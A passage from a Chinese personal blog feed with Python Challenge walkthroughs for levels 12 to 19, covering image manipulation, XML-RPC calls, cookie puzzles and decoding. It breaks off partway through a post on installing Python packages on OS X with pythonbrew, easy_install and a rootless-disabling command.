class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex3easqgtcj20hy0awwg5.jpg" alt=""><br>看不清的话请调亮一点，算了还是我来:<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex3eaodiqvj20hy0brtg6.jpg" alt=""></p><hr><h1 id="第十二关-gfx-拆分"><a href="#第十二关-gfx-拆分" class="headerlink" title="第十二关 gfx 拆分"></a><a href="http://www.pythonchallenge.com/pc/return/evil.html" target="_blank" rel="noopener">第十二关</a> gfx 拆分</h1><p>题目是<code>dealing evil</code><br>只有一个图，<code>evil1.jpg</code>:<br><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ex4dcijs2dj20hs0dcgno.jpg" alt="evil1"><br>然后就什么提示都没有了<br>想了半天想出来是应该有<code>evilx.jpg</code>的<br>当我看到<code>evil0.jpg</code>是404的时候确实挺失望的<br>幸好还有<code>evil2.jpg</code>。。。<br><code>not jpg - - .gfx</code><br>还有 <code>evil3.jpg</code><br><code>no more evils...</code><br>还有<code>evil4.jip</code>虽然不是 <code>jpg</code>格式的，但是下载下来打开还是有信息<br><code>burt is evil!go back!</code><br>查了一下这个<code>.gfx</code>格式  however跟后面解题完全无关了<br><strong>这里开始不是自己做的</strong><br>第一幅图里面是有个人在发牌，发了五张<br>正确的解题是下载<code>evil2.gfx</code>然后步进分成五个图片<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex4dghq992j20k404ojrw.jpg" alt="">  </p><hr><h1 id="第十三关-rpc-协议"><a href="#第十三关-rpc-协议" class="headerlink" title="第十三关 rpc 协议"></a><a href="http://www.pythonchallenge.com/pc/return/disproportional.html" target="_blank" rel="noopener">第十三关</a> rpc 协议</h1><p>是一个电话的图片<br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ex5r5ontkhj20hs0dcgm7.jpg" alt=""><br>查看源文件，跟前面哪个连线一样的，点击某个区域，跳转到<a href="http://www.pythonchallenge.com/pc/phonebook.php" target="_blank" rel="noopener">这个连接</a><br><strong>完全不会做</strong><br>下面是找到的方法:  </p><blockquote><p>xmlrpc是使用http协议做为传输协议的rpc机制，使用xml文本的方式传输命令和数据blablabla…<br>反正就是要用到python的xmlrpclib模块来连接这个php页面，然后查看其方法，其中有个名为phone方法就是答案。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">disproportional</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">import</span> xmlrpclib</span><br><span class="line">    xml_rpc = xmlrpclib.ServerProxy(<span class="string">"http://www.pythonchallenge.com/pc/phonebook.php"</span>)</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.system.listMethods()</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.system.methodHelp(<span class="string">'phone'</span>)</span><br><span class="line">    <span class="keyword">print</span> xml_rpc.phone(<span class="string">'Bert'</span>)</span><br><span class="line"> &gt;&gt;&gt; [<span class="string">'phone'</span>, <span class="string">'system.listMethods'</span>, <span class="string">'system.methodHelp'</span>, <span class="string">'system.methodSignature'</span>, <span class="string">'system.multicall'</span>, <span class="string">'system.getCapabilities'</span>]</span><br><span class="line">    Returns the phone of a person</span><br><span class="line">    <span class="number">555</span>-ITALY</span><br></pre></td></tr></table></figure></p></blockquote><p><code>rpc</code>协议以后来补，<del>however</del> ，答案就是 <code>italy</code>  </p><hr><h1 id="第十四关-编程"><a href="#第十四关-编程" class="headerlink" title="第十四关 编程"></a><a href="http://www.pythonchallenge.com/pc/return/italy.html" target="_blank" rel="noopener">第十四关</a> 编程</h1><p>有个螺旋形的面包，源代码提示<code>walk around</code>,<code>&lt;!-- remember: 100*100 = (100+99+99+98) + (...  --&gt;</code><br>下面一张图，格式相当奇葩<code>10000*1</code>的一个<code>png</code><br>猜到了就是读图然后按照螺旋写成一个<code>100*100</code>的图<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.open(<span class="string">'wire.png'</span>)</span><br><span class="line">mi = Image.open(<span class="string">'wire0.png'</span>)</span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    L.append(im.getpixel((n,<span class="number">0</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span><span class="number">-2</span>*n):</span><br><span class="line">        mi.putpixel((n+i,n),L.pop())</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">99</span><span class="number">-2</span>*n):</span><br><span class="line">        mi.putpixel((<span class="number">99</span>-n,j+<span class="number">1</span>+n),L.pop())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span><span class="number">-2</span>*n):</span><br><span class="line">        mi.putpixel((<span class="number">98</span>-i-n,<span class="number">99</span>-n),L.pop())</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">98</span><span class="number">-2</span>*n):</span><br><span class="line">        mi.putpixel((n,<span class="number">98</span>-j-n),L.pop())  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    round(<span class="number">50</span>-i)</span><br><span class="line">mi.show()</span><br></pre></td></tr></table></figure></p><p>出来是一只小猫。。。<br><img src="http://ww3.sinaimg.cn/large/a243ad6cjw1ex6gli5dslj208808874t.jpg" alt=""><br>我就进入<code>cat.html</code>，但是貌似这个不是第十五关，毕竟左上角没有<code>15</code><br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ex6glgh7fcj20k70eyq5h.jpg" alt=""><br><code>cat.html</code>网页源码如下:  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>uzi<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"../style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">"gold"</span> <span class="attr">size</span>=<span class="string">"+1"</span>&gt;</span></span><br><span class="line">and its name is <span class="tag">&lt;<span class="name">b</span>&gt;</span>uzi<span class="tag">&lt;/<span class="name">b</span>&gt;</span>. you'll hear from him later.</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"uzi.jpg"</span> <span class="attr">width</span>=<span class="string">"640"</span> <span class="attr">height</span>=<span class="string">"480"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>应该是另外一种旋转方法才对。。。<br>红色的应该就是信息，只绕了一又四分之一圈。。。<br>结果这样就出来了:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"><span class="keyword">im</span> = Image.<span class="keyword">open</span>(<span class="string">'wire.png'</span>)</span><br><span class="line">mi = Image.<span class="keyword">open</span>(<span class="string">'wire0.png'</span>)</span><br><span class="line">L = []</span><br><span class="line"><span class="keyword">for</span> n in <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">    L.<span class="keyword">append</span>(<span class="keyword">im</span>.getpixel((n,<span class="number">0</span>)))</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">j</span> in <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        mi.putpixel((i,<span class="keyword">j</span>),L.<span class="keyword">pop</span>())</span><br><span class="line">mi.show()</span><br></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex6gw76pfsj205l05l0t2.jpg" alt=""><br>是<code>bit</code>？<br><strong>不！可！能！这！么！简！单</strong><br>果然，猫的名字是<code>uzi</code>，正确的页面应该是 uzi 才对</p><hr><h1 id="第十五关-编程"><a href="#第十五关-编程" class="headerlink" title="第十五关 编程"></a><a href="http://www.pythonchallenge.com/pc/return/uzi.html" target="_blank" rel="noopener">第十五关</a> 编程</h1><p>还是得看攻略。。。<br>这上面这个是1xx6年，右下角说这一年的二月有29天，然后<code>今天</code>是一月26号，这一年的1月27号有事情要买花。<br>就是查这个<code>&lt;!-- he ain&#39;t the youngest, he is the second --&gt;</code><br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">k = <span class="number">6</span></span><br><span class="line"><span class="built_in">day</span> = <span class="number">26</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">1006</span>,<span class="number">1997</span>):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i%<span class="number">100</span>!=<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">day</span> += <span class="number">366</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">day</span> += <span class="number">365</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">day</span>%<span class="number">7</span> == k <span class="keyword">and</span> i%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> i%<span class="number">100</span>!=<span class="number">0</span> <span class="keyword">and</span> i%<span class="number">10</span>==<span class="number">6</span>:</span><br><span class="line">        print(str(i)+' <span class="keyword">is</span> a leap <span class="built_in">year</span> <span class="keyword">and</span> <span class="number">26.</span>Jan <span class="keyword">is</span> Monday, <span class="keyword">and</span> <span class="keyword">is</span> one <span class="keyword">of</span> a <span class="number">1</span>xx6')</span><br></pre></td></tr></table></figure></p><p>把日历打开看了一下才把这个<code>k = 6</code>的值找到，用来校准周信息<br>第二年轻的就是<code>1956 27.Jan</code>这个是<code>莫扎特</code>的生日</p><hr><h1 id="第十六关-list-操作"><a href="#第十六关-list-操作" class="headerlink" title="第十六关 list 操作"></a><a href="http://www.pythonchallenge.com/pc/return/mozart.html" target="_blank" rel="noopener">第十六关</a> list 操作</h1><p>一张图<code>let me get this straight</code>:<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex6lrv67j9g20hs0dc0zc.gif" alt=""><br>放大看每一行都有且只有一个<code>白紫紫紫紫紫白</code>，每一行都看做循环的，用这个标志对齐<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from PIL import Image</span><br><span class="line"><span class="keyword">im</span> = Image.<span class="keyword">open</span>(<span class="string">'mozart.png'</span>)</span><br><span class="line">L = []</span><br><span class="line">front = []</span><br><span class="line">back = []</span><br><span class="line"><span class="keyword">for</span> n in <span class="built_in">range</span>(<span class="number">480</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">m</span> in <span class="built_in">range</span>(<span class="number">640</span>):</span><br><span class="line">        L.<span class="keyword">append</span>(<span class="keyword">im</span>.getpixel((<span class="keyword">m</span>,n)))</span><br><span class="line">    L.<span class="built_in">reverse</span>()</span><br><span class="line">    front = L[:L.<span class="built_in">index</span>(<span class="number">195</span>)]</span><br><span class="line">    back = L[(L.<span class="built_in">index</span>(<span class="number">195</span>)-<span class="number">640</span>):]</span><br><span class="line">    L = back+front</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">m</span> in <span class="built_in">range</span>(<span class="number">640</span>):</span><br><span class="line">        <span class="keyword">im</span>.putpixel((<span class="keyword">m</span>,n),L.<span class="keyword">pop</span>())</span><br><span class="line">    L = []</span><br><span class="line"><span class="keyword">im</span>.show()</span><br></pre></td></tr></table></figure></p><p>其中的<code>195</code>是我先输出第一行之后找的，本来想找<code>249</code>这个白色的，但是从第二行开始就没有<code>249</code>的白色了，其实可以<code>try、except</code>的，太麻烦了。。。 就找后面的紫色<code>195</code>了<br><code>reverse()</code>函数把<code>L</code>给反过来再<code>pop()</code>，输出就不是镜像的<br>看图<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex6u9sowwwj20kw0hztnl.jpg" alt=""></p><hr><h1 id="第十七关这道题能自己做出来的都是大神"><a href="#第十七关这道题能自己做出来的都是大神" class="headerlink" title="第十七关这道题能自己做出来的都是大神"></a><a href="http://www.pythonchallenge.com/pc/return/romance.html" target="_blank" rel="noopener">第十七关</a>这道题能自己做出来的都是大神</h1><p>看到<code>cookie</code>现在都果断看不到趣多多了<br><img src="http://ww4.sinaimg.cn/large/a243ad6cjw1ex6ue2hds4j20t3024q3u.jpg" alt=""><br>貌似要改 <code>cookie</code>但是不知道从哪里改呢。。。又要开始查答案了，没意思<br><strong>左下角是你做过的一道题，我反正记不得了</strong> <a href="http://www.pythonchallenge.com/pc/def/linkedlist.php" target="_blank" rel="noopener">木头人推磨</a><br>果然是这样的,就是在<a href="http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing=12345" target="_blank" rel="noopener">busynothing</a>这个<code>php</code>页面上进行不断获取<code>cookie</code>的事情，然后还要一遍获取<code>cookie</code>:<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> cookielib</span><br><span class="line"><span class="literal">nothing</span> = <span class="string">"44827"</span></span><br><span class="line">cj = cookielib.CookieJar()</span><br><span class="line">j = <span class="string">"B"</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">500</span>):</span><br><span class="line">    url = 'http://www.pythonchallenge.com/pc/def/linkedlist.php?busynothing='+<span class="literal">nothing</span></span><br><span class="line">    <span class="keyword">global</span> <span class="literal">nothing</span></span><br><span class="line">    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line">    urllib2.install_opener(opener)</span><br><span class="line">    <span class="literal">nothing</span> = urllib2.urlopen(url).read().decode()[<span class="number">27</span>:].strip()</span><br><span class="line">    print <span class="literal">nothing</span></span><br><span class="line">    <span class="keyword">for</span> index, cookie <span class="keyword">in</span> enumerate(cj):</span><br><span class="line">        cookie = str(cookie).replace('&lt;Cookie info=<span class="string">','</span>').replace(' <span class="keyword">for</span> .pythonchallenge.com/&gt;<span class="string">','</span>').strip()</span><br><span class="line">        j+= cookie</span><br><span class="line">    print j</span><br></pre></td></tr></table></figure></p><p>最后是这样的<br><code>BZh91AY%26SY%94%3A%E2I%00%00%21%19%80P%81%11%00%AFg%9E%A0+%00hE%3DM%B5%23%D0%D4%D1%E2%8D%06%A9%FA%26S%D4%D3%21%A1%EAi7h%9B%9A%2B%BF%60%22%C5WX%E1%ADL%80%E8V%3C%C6%A8%DBH%2632%18%A8x%01%08%21%8DS%0B%C8%AF%96KO%CA2%B0%F1%BD%1Du%A0%86%05%92s%B0%92%C4Bc%F1w%24S%85%09%09C%AE%24%90</code><br>是以前做过的一道<code>bz2</code>压缩包的解密<br>但是他又告诉我这个<code>IOError: invalid data stream</code><br><strong>又要看答案了好伤心</strong>  </p><blockquote><p>import urllib<br>urllib.unquote(j)<br>然后里面有个加号，这里要把加号去掉:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">print</span> <span class="selector-tag">bz2</span><span class="selector-class">.BZ2Decompressor</span>()<span class="selector-class">.decompress</span>(<span class="selector-tag">urllib</span><span class="selector-class">.unquote_plus</span>(<span class="selector-tag">j</span>))</span><br></pre></td></tr></table></figure></p></blockquote><p><strong>你以为有答案了么？图样</strong>  </p><p><code>is it the 26th already? call his father and inform him that &quot;the flowers are on their way&quot;. he&#39;ll understand.</code></p><p>这里要告诉他的爸爸花在路上了。<br>谁的爸爸？莫扎特的爸爸。怎么告诉他？打电话。<br>百度莫扎特的爸爸:<code>Leopold</code><br>这里又要前面打电话的:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import xmlrpclib</span><br><span class="line">xml_rpc = xmlrpclib.ServerProxy(<span class="string">"http://www.pythonchallenge.com/pc/phonebook.php"</span>)</span><br><span class="line">print xml_rpc<span class="selector-class">.system</span><span class="selector-class">.listMethods</span>()</span><br><span class="line">print xml_rpc<span class="selector-class">.system</span><span class="selector-class">.methodHelp</span>(<span class="string">'phone'</span>)</span><br><span class="line">print xml_rpc.phone(<span class="string">'Leopold'</span>)</span><br></pre></td></tr></table></figure></p><p>他爸爸的电话就有了:<code>555-VIOLIN</code><br><strong>你以为答案就出来了么？图样</strong><br>你要先进<code>violin.html</code>，然后根据提示来到<code>/stuff/violin.php</code><br><strong>你以为答案就出来了么？图样</strong><br>他爸爸就在这里，你要告诉他花在路上了<br>怎么告诉他?在 <code>cookie</code>里面,幸好我的 <code>chrome</code>还有<code>edit this cookie</code>插件<br>在<a href="http://www.pythonchallenge.com/pc/stuff/violin.php" target="_blank" rel="noopener">这个页面</a>新建一个<code>cookie</code>，名字叫<code>info</code>，值为<code>the+flowers+are+on+their+way</code>,然后刷新<br><img src="http://ww1.sinaimg.cn/large/a243ad6cjw1ex6yq8ivokj209p08kdge.jpg" alt="">  </p><hr><h1 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a><a href="http://www.pythonchallenge.com/pc/return/balloons.html" target="_blank" rel="noopener">第十八关</a></h1><p><code>difference</code> is <code>brigtness</code><br><a href="http://www.pythonchallenge.com/pc/return/brightness.html" target="_blank" rel="noopener">brightness.html</a></p><blockquote><p>\<!-- maybe consider deltas.gz -->  </p></blockquote><p>download <code>deltas.pz</code> and unzip    </p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import difflib</span><br><span class="line"></span><br><span class="line">both       = <span class="keyword">open</span>(<span class="string">'deltas'</span>).<span class="keyword">read</span>().<span class="keyword">split</span>(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">left</span>,<span class="keyword">right</span>,fileleft,fileright,filecommon = [],[],[],[],[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>    i in both: </span><br><span class="line">    <span class="keyword">left</span>.<span class="keyword">append</span>(i[:<span class="number">53</span>])</span><br><span class="line">    <span class="keyword">right</span>.<span class="keyword">append</span>(i[<span class="number">56</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"differing..."</span></span><br><span class="line">diff  = <span class="keyword">list</span>(difflib.Differ().compare(<span class="keyword">left</span>,<span class="keyword">right</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">line</span> in diff:</span><br><span class="line">    <span class="built_in">line</span> += <span class="string">'\n'</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>]==<span class="string">' '</span>:</span><br><span class="line">        filecommon.<span class="keyword">append</span>(<span class="built_in">line</span>[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>]==<span class="string">'+'</span>:</span><br><span class="line">        fileright.<span class="keyword">append</span>(<span class="built_in">line</span>[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">line</span>[<span class="number">0</span>]==<span class="string">'-'</span>:</span><br><span class="line">        fileleft.<span class="keyword">append</span>(<span class="built_in">line</span>[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> n, data in enumerate((filecommon, fileright, fileleft)):  </span><br><span class="line">    temp = []  </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">line</span> in dat<span class="variable">a:</span>  </span><br><span class="line">        temp.<span class="built_in">extend</span>([chr(<span class="keyword">int</span>(<span class="keyword">o</span>, <span class="number">16</span>)) <span class="keyword">for</span> <span class="keyword">o</span> in <span class="built_in">line</span>.strip().<span class="keyword">split</span>(<span class="string">" "</span>) <span class="keyword">if</span> <span class="keyword">o</span>])  </span><br><span class="line">   </span><br><span class="line">    h = <span class="keyword">open</span>(<span class="string">"%s.png"</span> % (n + <span class="number">1</span>), <span class="string">"wb"</span>)  </span><br><span class="line">    h.writelines(temp)  </span><br><span class="line">    h.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><p><img src="http://ww2.sinaimg.cn/large/a243ad6cjw1ex8qkb44y3j20ro0a3my0.jpg" alt="">  </p><hr><h1 id="19-butter-fly"><a href="#19-butter-fly" class="headerlink" title="19 (butter+fly)"></a><a href="http://www.pythonchallenge.com/pc/hex/bin.html" target="_blank" rel="noopener">19 (butter+fly)</a></h1><blockquote><p>Content-type: audio/x-wav; name=”indian.wav”<br>Content-transfer-encoding: base64  </p></blockquote><p>download the messy code and store as txt,then <code>base64</code> decode as a <code>wav</code> file.<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="built_in">text</span> = <span class="built_in">open</span>(<span class="string">'indian.txt'</span>,<span class="string">'r'</span>).<span class="built_in">read</span>()  </span><br><span class="line">indian = <span class="built_in">open</span>(<span class="string">'indian.wav'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">wav = base64.b64decode(<span class="built_in">text</span>)  </span><br><span class="line">indian.<span class="built_in">write</span>(wav)  </span><br><span class="line">indian.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure></p><p>somebody is yelling ‘sorry’, so jump to <code>sorry.html</code>  </p><blockquote><p> “what are you apologizing for?”  </p></blockquote><p>i can not continue myself, so i googled, sad.<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import wave  </span><br><span class="line"><span class="keyword">wi</span> = wave.<span class="keyword">open</span>(<span class="string">'indian.wav'</span>,<span class="string">'rb'</span>)  </span><br><span class="line">wo = wave.<span class="keyword">open</span>(<span class="string">'indian_out.wav'</span>,<span class="string">'wb'</span>)  </span><br><span class="line">wo.setparams(<span class="keyword">wi</span>.getparams())  </span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">wi</span>.getnframes()):  </span><br><span class="line">    wo.writeframes(<span class="keyword">wi</span>.readframes(<span class="number">1</span>)[::-<span class="number">1</span>])  </span><br><span class="line"><span class="keyword">wi</span>.<span class="keyword">close</span>()  </span><br><span class="line">wo.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure></p><p><code>you are an idiot,hah hah hah</code>  </p><hr><p>以上</p>]]></content>
      
      
      <categories>
          
          <category> 硬悟学蛇 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>安装 Python 库文件</title>
      <link href="/2015/10-16-install-python-package/"/>
      <url>/2015/10-16-install-python-package/</url>
      
        <content type="html"><![CDATA[<p>我用的<code>pythonbrew</code>来管理我的两个 <code>python</code>版本<br>但是在使用第三方<code>package</code>的时候，<code>pip</code>总是不好用<br><code>pip install</code>的全部都在原来的地方，而非<code>pythonbrew</code>的文件夹下面<br>搞了好久才找到正确使用的姿势<br><a id="more"></a></p><hr><h1 id="取消rootless"><a href="#取消rootless" class="headerlink" title="取消rootless"></a>取消<code>rootless</code></h1><p><code>OSX</code>有个<code>rootless</code>机制，不要你碰<code>usr/bin</code>里面的东西<br>就算你加上了<code>sudo</code>都不行，用这个来关闭:<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram <span class="keyword">boot</span>-<span class="keyword">args</span>=<span class="string">"rootless=0"</span></span><br></pre></td></tr></table></figure></p><p>完了要重启<br>至于怎么重新<code>enable</code>。。。  我也不知道  </p><hr><h1 id="关闭-pythonbrew"><a href="#关闭-pythonbrew" class="headerlink" title="关闭 pythonbrew"></a>关闭 <code>pythonbrew</code></h1><p>本来在<a href="http://stackoverflow.com/" target="_blank" rel="noopener">Stack Overflow</a>上面查到了的<br>也有人是这样的，在 <code>pythonbrew</code>下面不能使用<code>pip</code>  </p><blockquote><p>I found a solution. I uninstalled my Python 3.3.0 by issuing <code>pythonbrew uninstall 3.3.0</code>. Then I installed it again with <code>pythonbrew install --configure=&quot;--with-zlib&quot; 3.3.0</code>. This allowed pip to install and thus now I can use it to install to this Python version.</p></blockquote><p>就是先卸载，然后用<code>--configure=&quot;--with-zlib&quot;</code>这个选项重新安装<br>我尝试的时候是出错跳过了<code>option</code>又安装了一次，跟原来的一样<br>所以我还是把它关了，既然<code>pip install</code>在我自带的 python 下<br>我就好好用这个自带的版本:<code>pythonbrew off</code></p><hr><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo easy_install pip</span><br><span class="line">pip <span class="keyword">install</span> XXX</span><br></pre></td></tr></table></figure><p>我的还是有问题的<br>于是使用这个来安装:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> easy_install XXX</span><br></pre></td></tr></table></figure></p><p>然后就可以使用刚刚安装的<code>package</code>了</p><hr><h1 id="更新问题"><a href="#更新问题" class="headerlink" title="更新问题"></a>更新问题</h1><p><code>python package</code>具体的路径为<code>/Library/Python/2.7/site-packages</code><br>然后这里面的文件夹名字要和你<code>import</code>后面的名字一样才行<br><code>SOF</code>上面有个人文件夹叫做<code>pil</code>，改成<code>PIL</code>就能用了<br>对了，我遇见的问题是这个:<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">ImportError:</span> <span class="literal">No</span> <span class="string">module</span> <span 